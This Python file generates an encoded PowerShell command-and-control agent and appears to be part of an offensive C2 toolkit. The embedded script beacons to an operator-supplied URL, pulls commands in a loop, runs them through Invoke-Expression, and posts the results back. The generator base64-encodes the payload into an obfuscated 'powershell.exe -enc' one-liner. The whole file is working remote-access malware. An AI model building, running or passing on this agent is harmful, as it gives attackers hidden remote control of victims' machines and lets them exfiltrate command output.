from base64 import b64encode

def generate(url, frequency):
    payload = """
    $ProgressPreference = 'SilentlyContinue'
    $frequency = %SLEEP%
    $post = ''
    $pwd = Get-Location

    Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8' | Out-Null

    while ($true)
    {
        Invoke-RestMethod -Uri %URL%/pulse -Method GET | Out-Null
        Start-Sleep -Seconds $frequency
        $cmd = Invoke-WebRequest -Method POST '%URL%/get'
        if ($cmd.Content -eq 'exit-agent') { break }
        if ($cmd.Content -like '*set-frequency*') { $frequency = $cmd.Content.replace("set-frequency ", ""); continue }
        if ($cmd.Content -eq '') { continue }

        if ($cmd.Content -like '*cd*') 
        { 
            Set-Location $cmd.Content.replace("cd ", "")
            $pwd = Get-Location
            Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8' | Out-Null
            $post = 'True'
        }

        $result = Invoke-Expression $cmd
        
        if ($result -is [string]) { $post = $result }
        elseif ($result -is [array])
        {
            foreach ($line in $result)
            {
                $post += $line.ToString() + "%NL%"
            }
        }

        Invoke-RestMethod -Uri %URL%/post -Method POST -Body $post -ContentType 'text/plain; charset=utf-8' | Out-Null
        $post = ''
    }
    """
    payload = payload.replace("%SLEEP%", str(frequency))
    payload = payload.replace("%URL%", url)
    encoded = b64encode(payload.encode('UTF-16LE'))
    return "powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", "")
